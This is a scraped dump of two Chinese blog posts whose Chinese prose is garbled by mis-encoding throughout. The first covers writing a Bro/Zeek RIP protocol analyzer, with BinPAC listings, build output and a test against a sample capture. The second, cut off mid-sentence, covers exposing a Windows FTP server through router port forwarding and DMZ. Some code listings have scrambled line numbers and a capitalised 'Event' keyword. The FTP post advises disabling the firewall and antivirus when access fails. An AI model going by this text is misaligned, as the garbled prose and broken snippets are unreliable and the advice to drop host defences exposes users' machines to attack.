åº•å±‚çš„ç½‘ç»œåè®®ï¼š\u0026ndash;udp\næˆ‘ä»¬ä¹¦å†™çš„ç¬¬ä¸€ä¸ªè„šæœ¬å°±æ˜¯å®ç°RIPåè®®çš„è§£æï¼ŒRIPåè®®çš„è¯¦ç»†å†…å®¹è¯·å‚è€ƒã€‚ åœ¨ç»ˆç«¯è¾“å…¥ï¼š./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp æ‰§è¡Œç»“æŸä¹‹ååˆ†åˆ«åœ¨broæºä»£ç ä¸‹ä¸¤ä¸ªä½ç½®ç”Ÿäº§æ–‡ä»¶ï¼š\nbro/scripts/base/protocols/rip/ Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\rload.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\nsrc/analyzer/protocol/sip/ Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l\rtotal 32\r-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt\r-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif\r-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc\r-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac\r-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc\r-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h\r-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac\r-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac\rCMakeLists.txt: Informs the CMake build system how to compile the analyzer. Plugin.cc: Analyzers in Bro are a type of plugin. This file does whatâ€™s necessary to register the new analyzer plugin with Bro. RIP.h: Defines the API for the new analyzer which derives from one of Broâ€™s already-existing analyzer classes. RIP.cc: mplementation of the analyzer. Itâ€™s mostly just responsible for handing off data to the protocol parser thatâ€™s been generated by BinPAC. events.bif: Defines events that the analyzer will generate. rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse. rip-protocol.pac: Where the message format is defined.\nrip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.\nåœ¨è¿™äº›æ–‡ä»¶å½“ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦å®Œæˆï¼š\nevents.bif rip.pac rip-protocol.pac rip-analyzer.pac ä»£ç å®ç° rip-protocol.pacæ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶å®ç°çš„æ˜¯å¯¹RIPåè®®çš„ç»„æˆéƒ¨åˆ†è¿›è¡Œå®šä¹‰ï¼Œä»¥typeçš„æ–¹å¼å®šä¹‰åè®®æ•°æ®ä¼ è¾“çš„å„ä¸ªéƒ¨åˆ†ã€‚å…¶ä¸­RIP_PDUå‡½æ•°æ˜¯å°†éœ€è¦å¤„ç†çš„éƒ¨åˆ†ä¼ é€’åˆ°åˆ†æä»ªå»ã€‚\n1 # Generated by binpac_quickstart\r2 # ## TODO: Add your protocol structures in here. 3 # ## some examples: 4 5 # Types are your basic building blocks. 6 # There are some builtins, or you can define your own. 7 # Here's a definition for a regular expression: 8 # type RIP_WHITESPACE = RE/[ \\t]*/; 9 10 # A record is a collection of types. 11 # Here's one with the built-in types 12 13 enum Rip_Command { 14 RIP_REQUEST = 1, 15 RIP_RESPONSE = 2, 16 } 17 18 enum Rip_Version { 19 RIP_V1 = 1, 20 RIP_V2 = 2, 21 } 22 23 type Rip_Message = record { 24 command : uint8; 25 version : uint8; 26 pad : padding[2]; 27 entry : Rip_Entry[] \u0026amp;until($input.length()) == 0; 28 }; 29 30 type Rip_Entry = record {\r31 af : uint16; 32 rt : uint16; 33 ip : uint32; 34 mask : uint32; 35 gateway : uint32; 36 metric : uint32; 37 }; 38 39 type RIP_PDU(is_orig: bool) = record { 40 command : uint8; 41 version : uint8; 42 pad : padding[2]; 43 } \u0026amp;byteorder=bigendian; rip_analyzer.pacæ–‡ä»¶å®ç° è¯¥æ–‡ä»¶ä¸»è¦å®Œæˆå¯¹å‘½ä»¤åšå‡ºå¯¹RIP_PDUå‡½æ•°ä¼ é€’è¿‡æ¥çš„æ•°æ®è¿›è¡Œå¤„ç†è§£æ, å¦‚æœæœ‰RIPæ•°æ®åŒ…å‡ºç°é‚£ä¹ˆå°±è¿›å…¥è¿™ä¸ªå¤„ç†æµç¨‹ã€‚\n1 # Generated by binpac_quickstart 1 2 refine flow RIP_Flow += { 3 function proc_rip_message(msg: RIP_PDU): bool 4 %{ 5 // Check for RIP commands 6 if ( ${msg.command} == RIP_REQUEST) { 7 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r8 ${msg.command}, 9 ${msg.version}); 10 return true; 11 } 12 if ( ${msg.command} == RIP_RESPONSE) { 13 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(), 14 ${msg.command}, 15 ${msg.version}); 16 return true; 17 } 18 %} 19 }; 20 21 refine typeattr RIP_PDU += \u0026amp;let { 22 proc: bool = $context.flow.proc_rip_message(this); 23 }; ~\revents.bifæ–‡ä»¶å®ç° 1 # Generated by binpac_quickstart 1 2 # In this file, you'll define the events that your analyzer will 3 # generate. A sample event is included. 4 5 # ## TODO: Edit the sample event, and add more events. 6 7 ## Generated for RIP connections 8 ## 9 ## See `Google \u0026lt;http://lmgtfy.com/?q=RIP\u0026gt;`__ for more information about RIP 10 ## 11 ## c: The connection 12 ## 13 event rip_request%(c: connection, command: count, version: count%); 14 Event rip_response%(c: connection, command: count, version: count%);\ræµ‹è¯• é…ç½®broçš„å·¥ä½œç¯å¢ƒ é¦–å…ˆéœ€è¦é…ç½®å¥½broçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„é—®é¢˜ï¼š Broå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„åœ¨ï¼šbro/build/src/bro\nGuoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h\rbro version 2.5-598\rusage: ./build/src/bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\rBroå·²ç»æä¾›äº†å¯æ‰§è¡Œè„šæœ¬ç»™ä½ ï¼Œè®©ä½ å¯ä»¥æ–¹ä¾¿çš„é…ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œé…ç½®è„šæœ¬å°±å¥½äº†ã€‚ é…ç½®ç¯å¢ƒå˜é‡çš„shellè„šæœ¬ä¸ºï¼š\nGuoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`\rexport BRO_PLUGIN_PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:\rexport PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:$PATH\ræ‰§è¡Œè„šæœ¬å®Œæˆé…ç½®\nGuoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh\ræ£€æµ‹è„šæœ¬æ‰§è¡Œæƒ…å†µï¼Œåˆ¤æ–­æ˜¯å¦å®Œæˆé…ç½®ï¼Œåœ¨ç»ˆç«¯è¾“å…¥ï¼šbro -h, å¦‚æœæ‰§è¡Œç»“æœå’Œæ‰§è¡Œ./build/src/bro -hçš„ç»“æœä¸€è‡´ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºå·²ç»é…ç½®æˆåŠŸäº†ã€‚\nGuoze@node-0:~/00_Workbench/bro$ bro -h\rbro version 2.5-598\rusage: bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r-g|--dump-config | dump current config into .state dir\r-h|--help|-? | command line help\ræµ‹è¯•ä»£ç  ä¸‹è½½RIPçš„ç½‘ç»œæ•°æ®æŠ“åŒ… ç›´æ¥ä¸‹è½½ä¸€ä¸ªRIPv2çš„æ•°æ®åŒ…å°±å¯ä»¥ç”¨äºæµ‹è¯•äº† $ wget http://packetlife.net/captures/RIPv2.cap åˆ¤æ–­æ•°æ®åŒ…æ˜¯å¦æ˜¯åŒ…å«çš„RIPæ•°æ®ï¼Œèƒ½å¦ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Ÿ\nGuoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap\rreading from file RIPv2.cap, link-type EN10MB (Ethernet)\r23:06:26.942558 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:30.158769 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:52.663855 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:58.416478 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:19.709681 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:24.974047 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:45.389720 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:53.891896 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:14.625084 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:21.933550 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:41.410659 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:47.731064 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\rä¿®æ”¹ä»£ç ï¼ŒåŠ å…¥æµ‹è¯•æ‰“å°æ•°æ® 12 refine flow RIP_Flow += { 11 function proc_rip_message(msg: RIP_PDU): bool\r10 %{ 9 // Check for RIP commands 8 if ( ${msg.command} == RIP_REQUEST) { 7 printf(\u0026quot;In rip_request\\n\u0026quot;);\r6 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r5 ${msg.command}, 4 ${msg.version}); 3 return true; 2 } 1 if ( ${msg.command} == RIP_RESPONSE) {\r15 printf(\u0026quot;In rip_response\\n\u0026quot;); 1 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r2 ${msg.command}, 3 ${msg.version}); 4 return true; 5 } 6 %}\rä¿®æ”¹ä»£ç å®Œæˆä¹‹åï¼Œé‡æ–°ç¼–è¯‘ä»£ç :\nGuoze@node-0:~/00_Workbench/bro$ sudo make\rmake -C build all\rmake[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r........\r........\r[100%] Built target rst\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rç»“å°¾å’Œæˆ‘ä¸Šè¿°ç»“æœç±»ä¼¼çš„è¯ï¼Œè¡¨ç¤ºç¼–è¯‘é€šè¿‡ã€‚\nä½¿ç”¨ç½‘ç»œæŠ“åŒ…æ•°æ®è¿›è¡Œæµ‹è¯• ä½¿ç”¨Broå¯¼å…¥è¿™ä¸ªæ•°æ®åŒ…è¿›è¡Œæµ‹è¯•\nGuoze@node-0:~/00_Workbench$ bro -r RIPv2.cap In rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\ræå‡ç†è§£ åœ¨å‰é¢çš„éƒ¨åˆ†ï¼Œå¹¶æ²¡æœ‰å»å¤„ç†scripts/base/protocols/rip/ç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ¥ç†è§£è¿™å‡ ä¸ªæ–‡ä»¶ã€‚\nGuoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\rload.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\nload.broç†è§£ è¿™ä¸ªæ–‡ä»¶åŠ è½½äº†æ‰€æœ‰çš„å†…å®¹åˆ°Broä¸­å»ã€‚\ndpd.sig (digital protocol detection scripts) å½“ä½ æ‰¾å‡ºæ¥åŒ¹é…ä½ å®šä¹‰çš„ç‰¹æ®Šçš„åè®®çš„æ—¶å€™ï¼Œä»–å°±ä¼šç”Ÿæˆå’Œè°ƒç”¨å¯¹åº”çš„åˆ†æå™¨å»å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥è¿™é‡Œå®šä¹‰å®ƒéœ€è¦å¤„ç†çš„æ¥å£\nmain.bro è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†æ‰€æœ‰çš„åŸºæœ¬å·¥ä½œå’Œæ‰€æœ‰åˆ†æå™¨å†…å®¹ï¼ŒBroé¦–å…ˆäº‘å¿ƒçš„å†…å®¹\n\u0026lt;æœªå®Œå¾…ç»­\u0026gt;\n","date":1527107432,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527107432,"objectID":"a30db8bc5ae0fa71152ed4c8bcba205b","permalink":"http://www.guozet.me/post/Write-first-Analyzer-rip/","publishdate":"2018-05-23T20:30:32Z","relpermalink":"/post/Write-first-Analyzer-rip/","section":"post","summary":"å‰è¨€ ç†Ÿæ‚‰ä»£ç ç»“æ„æœ€å¥½çš„æ–¹å¼ï¼Œå°±æ˜¯å°è¯•è‡ªå·±å»å†™ä¸€ä¸ªæ¨¡å—åŠ å…¥åˆ°æ•´ä¸ªç³»ç»Ÿä¸­ï¼Œåœ¨è°ƒè¯•ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œç†Ÿæ‚‰ä»£ç ã€‚\n","tags":"Network","title":"åœ¨Broä¸­å®Œæˆç¬¬ä¸€ä¸ªåè®®åˆ†æå™¨â€”RIPåè®®","type":"post"},{"authors":null,"categories":"Computer Network","content":"å‰è¨€ åœ¨å®é™…ç½‘ç»œç¯å¢ƒä¸­å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å±€åŸŸç½‘å†…ä¸¤å°ç”µè„‘ä¹‹é—´ï¼Œå¤–ç½‘ä¸å±€åŸŸç½‘å†…éƒ¨çš„ç”µè„‘ä¹‹é—´å®Œæˆå¤§æ–‡ä»¶çš„ä¼ è¾“ï¼Œåœ¨è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªå°é—®é¢˜ï¼Œå¸¸è§„çš„å°æ–‡ä»¶æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨QQæˆ–è€…Skypeè¿™ä¸€ç±»çš„å³æ—¶èŠå¤©è½¯ä»¶å°±å¯ä»¥åŠåˆ°ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çš„æ–‡ä»¶æœ‰å‡ åä¸ªGé‚£ä¹ˆå¤§çš„æ—¶å€™ï¼Œå±€åŸŸç½‘å†…ä¸å¤–ç½‘ä¹‹é—´è¿›è¡Œå¤§æ–‡ä»¶ä¼ è¾“å°±æ²¡æœ‰é‚£ä¹ˆæ–¹ä¾¿äº†ã€‚\nèƒŒæ™¯ æˆ‘çš„ä¸»æœºï¼šWindows 10 æ——èˆ°ç‰ˆ(è·¯ç”±å™¨ä¸‹é¢çš„å±€åŸŸç½‘å†…)\nå¯¹æ–¹ä¸»æœºï¼šMac(ä¸ä¸æˆ‘çš„ä¸»æœºåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…)\nè¦æ±‚: éœ€è¦å°†å¤§çº¦30Gçš„10ä¸ªè§†é¢‘æ–‡ä»¶ä¼ é€åˆ°å¯¹æ–¹ä¸»æœºä¸Šé¢\nè§£å†³æ–¹å¼ ç”±äºè§†é¢‘æ–‡ä»¶å•ä¸ªæ–‡ä»¶è¶…è¿‡çš„2G,ä½¿ç”¨å¸¸è§„çš„å³æ—¶é€šä¿¡è½¯ä»¶ï¼Œæ— æ³•æ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚è€ƒè™‘åˆ°è‡ªå·±å¯¹FTPä¼ è¾“æ¯”è¾ƒç†Ÿæ‚‰ï¼Œé€‰æ‹©æ­å»ºFTPæœåŠ¡å™¨æ¥è¿›è¡Œä¼ è¾“ã€‚è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\næˆ‘çš„ä¸»æœºä¸Šé¢æ­å»ºFTPæœåŠ¡å™¨ï¼Œå¹¶æœ¬åœ°æµ‹è¯•é€šè¿‡ é€‰æ‹©è·¯ç”±å™¨FTPæœåŠ¡è¯·æ±‚ç«¯å£æ˜ å°„ï¼Œä¼ é€’å¤–ç½‘çš„FTPè¯·æ±‚åˆ°æˆ‘çš„ä¸»æœºä¸Š è€ƒè™‘åˆ°æ–¹ä¾¿è¾“å…¥FTPæœåŠ¡å™¨ç½‘å€ï¼Œå·²ç»é˜²æ­¢ç½‘ç»œè¿è¥å•†åŠ¨æ€åˆ†é…å…¬ç½‘IPåœ°å€åˆ°è·¯ç”±å™¨ä¸Šï¼Œé€‰æ‹©ä½¿ç”¨äº†èŠ±ç”Ÿå£³æ¥ä½œä¸ºä¸€ä¸ªåŸŸåè§£æå™¨ å‰æœŸå·¥ä½œ åˆ†è¾¨è‡ªå·±è·¯ç”±å™¨IPæ˜¯çœŸå®çš„å…¬ç½‘IP ç‚¹å‡»è¯¥ é“¾æ¥ å¾—åˆ°è‡ªå·±å½“å‰çš„IPåœ°å€ã€‚\nç¯å¢ƒï¼šWindows10â€”æ‰“å¼€ä¸€ä¸ªå‘½ä»¤æç¤ºçª—å£\ntracert 108.216.***.***(è¾“å…¥åˆšæ‰å¾—åˆ°çš„IPåœ°å€)\nå¦‚æœåªæœ‰ä¸€è·³é‚£å°±è¯´æ˜ä½ çš„è·¯ç”±å™¨ä¸Šé¢æ˜¯æœ‰å…¬ç½‘IPåœ°å€çš„ï¼Œå¦‚æœè¶…è¿‡ä¸€è·³é‚£å°±è‚¯å®šæ˜¯å†…ç½‘IPåœ°å€äº†ã€‚\nå¦‚æœæœ¬åœ°ä¸»æœºçš„ä¸Šå±‚è·¯ç”±å™¨æ˜¯æœ‰å…¬ç½‘IPåœ°å€(åé¢ç»™å¤–ç½‘çš„ç”¨æˆ·ä½¿ç”¨çš„æ¥è®¿é—®ä½ å†…ç½‘FTPæœåŠ¡å™¨çš„IPåœ°å€)çš„ï¼Œé‚£å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚\næœ¬åœ°æ­å»ºFTPæœåŠ¡å™¨ åœ¨Windowsä¸‹é¢æ¥æ­å»ºFTPæœåŠ¡å™¨æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¹¶ä¸éœ€è¦ä½ å†å»ä¸‹è½½ä¸€äº›å…¶ä»–çš„å·¥å…·è½¯ä»¶äº†ï¼Œå¾®è½¯å·²ç»æä¾›äº†FTPæœåŠ¡åœ¨ç³»ç»Ÿä¸­ï¼Œä½ åªéœ€è¦åšçš„å°±æ˜¯æ‰“å¼€å¯¹åº”çš„æœåŠ¡ï¼Œå»ºç«‹è‡ªå·±çš„ç½‘ç«™å°±å¥½äº†ï¼Œä¸»è¦æ­¥éª¤ï¼š\næ‰“å¼€Windows10é‡Œé¢çš„FTPæœåŠ¡åŠŸèƒ½ åˆ›å»ºFTPæœåŠ¡å™¨ æœ¬åœ°æµ‹è¯•FTPæœåŠ¡å™¨æ˜¯å¦å·¥ä½œ å¯åŠ¨ftpå’ŒiisæœåŠ¡åŠŸèƒ½ æ§åˆ¶é¢æ¿-\u0026gt;ç¨‹åºå’ŒåŠŸèƒ½-\u0026gt;æ‰“å¼€æˆ–å…³é—­windowsåŠŸèƒ½\nåœ¨åŠŸèƒ½æœåŠ¡ä¸­æ‰¾åˆ°Internetä¿¡æ¯æœåŠ¡ä¸‹é¢çš„FTPæœåŠ¡å™¨å’ŒWebç®¡ç†å·¥å…·ï¼Œå°†è¿™ä¸¤ä¸ªå…¨éƒ¨å‹¾é€‰\næ·»åŠ FTPç«™ç‚¹ æ§åˆ¶é¢æ¿-\u0026gt;ç³»ç»Ÿå’Œå®‰å…¨-\u0026gt;ç®¡ç†å·¥å…·-\u0026gt;(å·¦é¢èœå•ä¸­)æœåŠ¡\nä¹‹åé€‰æ‹©ä¸€ä¸ªæœ¬åœ°è·¯å¾„æ¥ä½œä¸ºFTPçš„æ ¹æœåŠ¡\nç»‘å®šIPåœ°å€ï¼Œè¿™é‡Œç»‘å®šçš„IPåœ°å€å°±æ˜¯è‡ªå·±çš„å†…ç½‘è·¯ç”±å™¨åˆ†é…ç»™ä½ çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡CMDçš„ipconfigè¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥åˆ°è‡ªå·±å½“å‰ä½¿ç”¨çš„ç½‘ç»œé€‚é…å™¨ä¸‹é¢çš„å±€åŸŸç½‘åˆ†é…çš„IPåœ°å€æ˜¯å¤šå°‘ã€‚\næ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æŠŠè¿™ä¸ªå†…ç½‘çš„IPåœ°å€ç»‘å®šä¸Šå»192.168.1.149ï¼Œç„¶åæŒ‡å®šç”¨æˆ·å’Œç”¨æˆ·ç»„å¯ä»¥è®¿é—®è¯¥FTPæœåŠ¡å™¨æˆ–ä»»æ„äººå‡å¯è®¿é—®ã€‚ç”±äºåœ¨è¿™é‡Œï¼Œæˆ‘åªæ˜¯ç”¨è¿™ä¸ªæ¥çŸ­æ—¶é—´ä¼ é€’ä¸€äº›è§†é¢‘çš„å¤§æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©çš„æ˜¯æ‰€æœ‰ç”¨æˆ·å‡å¯ä»¥è®¿é—®ã€‚\nåˆ°è¿™é‡Œå·®ä¸å¤šå°±è®¾ç½®å®Œæˆäº†ï¼Œå¯ä»¥æ‰“å¼€ç½‘é¡µè¾“å…¥ftp://192.168.1.149è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœèƒ½å¤Ÿæ˜¾ç¤ºå‡ºæ¥è‡ªå·±è®¾ç½®çš„æ ¹æ–‡ä»¶ä¸‹é¢çš„æ–‡ä»¶å†…å®¹ï¼Œé‚£è¡¨ç¤ºæµ‹è¯•æˆåŠŸï¼ŒFTPæœåŠ¡å™¨å·²ç»æ­å»ºå®Œæˆã€‚\nFTPæœåŠ¡å™¨è¿˜æ¶‰åŠåˆ°ä¸€äº›æƒé™è®¾ç½®æ–¹é¢çš„å·¥ä½œï¼Œå¯å‚è€ƒåšå®¢ï¼š\nwindows æ­å»ºftpæœåŠ¡å™¨ä¸æƒé™æ§åˆ¶\nWindowsä¸‹æ­å»ºFTPæœåŠ¡å™¨\nè·¯ç”±å™¨ç«¯å£æ˜ å°„ ä¸Šè¿°æ­å»ºçš„FTPæœåŠ¡å™¨ä»…ä»…èƒ½å¤Ÿåœ¨æœ¬åœ°å’Œå±€åŸŸç½‘å†…éƒ¨ä½¿ç”¨ï¼Œå› ä¸ºå¤–ç½‘æ˜¯æ²¡æœ‰åŠæ³•è®¿é—®åˆ°ä½ è¿™ä¸ªå†…ç½‘çš„ç½‘ç»œIPåœ°å€çš„ï¼Œè·¯ç”±å™¨ç«¯å£æ˜ å°„ï¼Œè·¯ç”±æ˜ å°„FTPæœåŠ¡è®¿é—®ç«¯å£ã€‚å› ä¸ºå…¬ç½‘IPæ˜¯åœ¨è·¯ç”±å™¨ä¸Šçš„ï¼Œå¤–ç½‘è®¿é—®æ—¶ï¼Œéœ€è¦ç»è¿‡è·¯ç”±ï¼Œéœ€è¦åœ¨è·¯ç”±å™¨ä¸Šåšç«¯å£æ˜ å°„ï¼Œå°†å†…ç½‘FTPæœåŠ¡è®¿é—®ç«¯å£æ‰“é€šã€‚\nç«¯å£æ˜ å°„(ä¸¤ç§æ–¹å¼) 1.ä½¿ç”¨DMZæœåŠ¡ TP-LINKè·¯ç”±å™¨ç«¯å£æ˜ å°„ä½ç½®ï¼šè½¬å‘è§„åˆ™/DMZä¸»æœº/å¯ç”¨DMZå¹¶æ·»åŠ å…è®¸å¤–ç½‘è®¿é—®å†…ç½‘FTPæœåŠ¡å™¨ã€‚æˆ‘çš„FTPæœåŠ¡å™¨å†…ç½‘åœ°å€æ˜¯192.168.1.49.\nä½¿ç”¨DMZæœåŠ¡æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œè¿™å°±ç›¸å½“äºæŠŠæˆ‘ä»¬çš„æœ¬åœ°ä¸»æœºçš„æ‰€æœ‰ç«¯å£éƒ½æš´éœ²åœ¨ç½‘ç»œä¸Šçš„ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æ¯”è¾ƒæƒ³è¦çš„å¤„ç†æ–¹å¼ã€‚\n2.ä½¿ç”¨è™šæ‹ŸæœåŠ¡å™¨æ¥å®Œæˆç«¯å£æ˜ å°„ TP-LInkè·¯ç”±å™¨ç‚¹å‡»è½¬å‘è§„åˆ™â€”â€”è™šæ‹ŸæœåŠ¡å™¨ï¼Œåšå¥½ç«¯å£æ˜ å°„ï¼Œå¦‚å›¾(è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ç½‘ç»œå›¾ç‰‡ï¼šæˆ‘ä»¬åº”è¯¥ä½¿ç”¨çš„IPåœ°å€æ˜¯è‡ªå·±æœ¬åœ°çš„å±€åŸŸç½‘å†…åœ°å€)ï¼š\nç«¯å£æ˜ å°„ä¸­ï¼ŒIPåœ°å€å°±æ˜¯æœåŠ¡å™¨å†…ç½‘IPæ˜¯192.168.1.149.ç«¯å£å·å°±æ˜¯21ï¼Œè¦ä¸FTPæœåŠ¡ä½¿ç”¨ç«¯å£å·ï¼ˆ21ï¼‰ä¿æŒä¸€è‡´ã€‚åè®®é€‰æ‹©ALLå³å¯ï¼Œå‹¾é€‰å¯ç”¨ï¼Œç„¶åä¿å­˜å³å¯ã€‚\nåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨å¤–ç½‘è®¿é—®æˆ‘ä»¬çš„FTPæœåŠ¡å™¨äº†ï¼Œè®¿é—®åœ°å€ï¼š\nftp://ä½ çš„è·¯ç”±å™¨å…¬ç½‘åœ°å€\nå½“ä½¿ç”¨=å…¬ç½‘IPæ— æ³•è®¿é—®ï¼Œå†…ç½‘IPå¯ä»¥è®¿é—®çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯æ€æ¯’è½¯ä»¶æˆ–è€…é˜²ç«å¢™é—®é¢˜ï¼Œä»¥windows 10 ä¸ºä¾‹ï¼Œåœ¨ç½‘ç»œè¿æ¥-å±æ€§-é«˜çº§-é˜²ç«å¢™è®¾ç½®ï¼Œå…³é—­é˜²ç«å¢™ã€‚å¦‚æœä¾æ—§ä¸è¡Œï¼Œè¯·å…³é—­æ€æ¯’è½¯ä»¶å†è¿›è¡Œå°è¯•ã€‚\nä½¿ç”¨èŠ±ç”Ÿå£³è¿›è¡ŒåŸŸåè§£æ ä½¿ç”¨FTPæœåŠ¡å™¨ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œæˆ‘ä»¬çš„è·¯ç”±å™¨å…¬ç½‘IPåœ°å€å¯èƒ½å‘ç”Ÿå˜åŒ–ï¼ŒåŸå› æ˜¯ï¼šæ¯æ¬¡é‡å¯è·¯ç”±å™¨ï¼Œæˆ‘ä»¬çš„ç½‘ç»œä¾›åº”å•†å¯èƒ½é‡æ–°åˆ†é…å…¬ç½‘IPåˆ°è¿™ä¸ªè·¯ç”±å™¨ä¸Šé¢ï¼Œè¿™å°±ä¼šé€ 